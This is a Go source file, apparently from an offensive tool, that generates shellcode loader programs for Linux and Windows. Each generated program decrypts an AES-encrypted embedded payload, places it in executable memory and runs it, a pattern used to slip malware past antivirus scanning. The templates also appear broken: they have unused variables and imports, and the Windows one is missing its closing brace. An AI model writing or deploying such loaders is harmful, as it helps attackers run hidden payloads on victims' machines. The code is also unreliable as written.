package loader

import (
	"fmt"
	"strings"
)

func LoadBasicTemplate(s Shellcode) string {
    if strings.ToLower(s.Target) == "windows" {
        return loadBasicWindows(s)
    }
    return loadBasicLinux(s)
}

func loadBasicLinux(s Shellcode) string {
    hexShellcode := ToString(s.Payload)
	hexKey := ToString(s.AesKey)
	hexTarget := ToString([]byte(s.Target))

    return fmt.Sprintf(`
package main

import (
    "syscall"
    "unsafe"
    "crypto/aes"
    "os"
    "strings"
    "strconv"
    "crypto/cipher"
    "errors"
)

func decrypt(key []byte, ciphertext []byte) ([]byte, error) {
    c, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(c)
    if err != nil {
        return nil, err
    }

    nonceSize := gcm.NonceSize()
    if len(ciphertext) < nonceSize {
        return nil, errors.New("ciphertext too short")
    }

    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}


func StringBytesParseString(byteString string) (string, error) {
    byteString = strings.TrimSuffix(byteString, "]")
    byteString = strings.TrimLeft(byteString, "[")
    sByteString := strings.Split(byteString, " ")
    var res []byte
    for _, s := range sByteString {
        i, err := strconv.ParseUint(s, 10, 64)
        if err != nil {
            return "", err
        }
        res = append(res, byte(i))
    }

    return string(res), nil
}

func main() {
    /* decode values from encoded bytes */
    key, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    bytesPayload, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    target, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    /* decrypt shellcode using AES */
    code, err := decrypt([]byte(key), []byte(bytesPayload)); if err != nil {
        os.Exit(1)
    }

    ptr, err := syscall.Mmap(
        -1,
        0,
        len(code),
        syscall.PROT_READ | syscall.PROT_WRITE | syscall.PROT_EXEC,
        syscall.MAP_PRIVATE | syscall.MAP_ANONYMOUS,
    ); if err != nil {
        os.Exit(1)
    }
    defer syscall.Munmap(ptr)

    // Copy the code into the allocated memory.
    copy(ptr, code)

    // Call the code as a function.
    syscall.Syscall(uintptr(ptr), 0, 0, 0, 0)
}
`, hexKey, hexShellcode, hexTarget)
}

func loadBasicWindows(s Shellcode) string {
    hexShellcode := ToString(s.Payload)
	hexKey := ToString(s.AesKey)
	hexTarget := ToString([]byte(s.Target))

    return fmt.Sprintf(`
package main

import (
    "syscall"
    "unsafe"
    "crypto/aes"
    "os"
    "strings"
    "strconv"
    "crypto/cipher"
    "errors"
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc    = kernel32.MustFindProc("VirtualAlloc")
	rtlCopyMemory   = kernel32.MustFindProc("RtlCopyMemory")
	createThread    = kernel32.MustFindProc("CreateThread")
	waitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
)


func decrypt(key []byte, ciphertext []byte) ([]byte, error) {
    c, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(c)
    if err != nil {
        return nil, err
    }

    nonceSize := gcm.NonceSize()
    if len(ciphertext) < nonceSize {
        return nil, errors.New("ciphertext too short")
    }

    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}


func StringBytesParseString(byteString string) (string, error) {
    byteString = strings.TrimSuffix(byteString, "]")
    byteString = strings.TrimLeft(byteString, "[")
    sByteString := strings.Split(byteString, " ")
    var res []byte
    for _, s := range sByteString {
        i, err := strconv.ParseUint(s, 10, 64)
        if err != nil {
            return "", err
        }
        res = append(res, byte(i))
    }

    return string(res), nil
}

func main() {
    /* decode values from encoded bytes */
    key, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    bytesPayload, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    target, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    /* decrypt shellcode using AES */
    code, err := decrypt([]byte(key), []byte(bytesPayload)); if err != nil {
        os.Exit(1)
    }

    addr, _, err := virtualAlloc.Call(0, uintptr(len(code)), 0x1000|0x2000, 0x40)
	if err != nil && err.Error() != "The operation completed successfully." {
		panic(err)
	}
	defer syscall.Syscall(0x7FFE0000|0x1D, 3, uintptr(addr), 0, 0)

	// Copy the code into the allocated memory.
	_, _, err = rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))
	if err != nil {
		panic(err)
	}

	// Create a new thread to execute the code.
	handle, _, err := createThread.Call(0, 0, addr, 0, 0, 0)
	if handle == 0 {
		panic(err)
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	// Wait for the thread to finish.
	syscall.WaitForSingleObject(syscall.Handle(handle), syscall.INFINITE)
    `, hexKey, hexShellcode, hexTarget)
}
